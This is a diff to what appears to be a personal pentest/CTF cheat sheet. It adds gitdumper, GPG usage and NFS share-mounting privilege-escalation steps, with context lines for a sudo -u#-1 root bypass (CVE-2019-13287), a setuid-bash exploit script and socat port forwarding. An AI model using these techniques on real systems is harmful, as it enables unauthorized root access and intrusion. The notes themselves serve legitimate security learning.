@@ -37,8 +37,20 @@ and on and on and on
 20. Always check `netstat -tulpn`
 21. Enum smtp with telnet.
 22. On windows, always check `whoami /priv` and find recent vulnerability.
+23. Always check .git, and dont forget to use gitdumper.
+
 
  
+**GPG**
+https://linux.101hacks.com/unix/gpg-command-examples/
+Example to encrypt:
+1. gpg --import [public_key]
+2. gpg --recipient [user will be recieving] --encrypt [file_name]
+3. The output shouldbe [file_name].gpg
+Example to decrypt:
+1. gpg --decrypt [file_name]
+
+
 
 **CVE-2019-13287**
 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
@@ -117,7 +129,7 @@ Ex: http://10.8.102.36:8080/ >> Our ip and the service port we want to proxy
 - check `/etc/ssh/sshd_config` for the SSH details.
 
 On the target machine:
-==== If the target doenst have socat, just download it from https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat then transfer it.
+==== If the target doesnt have socat, just download it from https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat then transfer it.
 
 1. socat tcp-listen:[Anyport],reuseaddr,fork tcp:[The_service_IP]:[Service_pirt]
 Ex: socat tcp-listen:9999,reuseaddr,fork tcp:localhost:22
@@ -230,6 +242,18 @@ echo "chmod +s /bin/bash" > exploit.sh
 1. showmount -e <remote-ip>
 2. sudo mkdir /mnt/[name_of_the_mount]
 3. sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]
+===
+If there's NFS Service running but u cant remote. Very likely it will be used in privesc and not foothold
+1. Check `cat /etc/exports` (if rw, root_squash flag enabled on the shared directory), you can mount it to your local machine
+2. sudo mkdir /mnt/[name_of_the_mounts]; sudo mount -t nfs <remote-ip>:<shared_directory> /mnt/[name_of_the_mount] 
+3. Now you can access the directory locally.
+4. If permission is denied when accessing, create a user with the same name, same UID, and same GID, as the owner of the share. (to create the same environment)
+```
+sudo useradd -u [id] -d [home_directory, /dev/shm atau tmp aja sih] [username]
+to delete it
+sudo userdel -r [username]
+```
+5. sudo su to the user and now you can access it. 
 
 
 
